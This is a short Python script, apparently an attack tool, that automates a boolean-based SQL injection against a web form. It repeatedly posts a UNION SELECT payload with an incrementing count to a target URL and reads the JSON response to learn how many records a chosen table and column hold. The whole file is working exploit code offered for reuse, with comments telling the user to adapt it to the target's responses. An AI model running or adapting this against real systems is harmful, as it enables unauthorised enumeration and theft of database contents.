import json
from requests import *

def count_record(url,param,table,column):
    indx_name = "user"   #you must edit this part , your response index name
    count = 0
    while(True):
        d = {param : f"0' UNION SELECT {column} FROM {table} WHERE (SELECT COUNT({column}) FROM {table})={count}#"}
        req = post(url,data=d)
        res = json.loads(req.text)

        if(res[indx_name] == "exist"):  # edit exist your true state message
            return count
        else:
            count+=1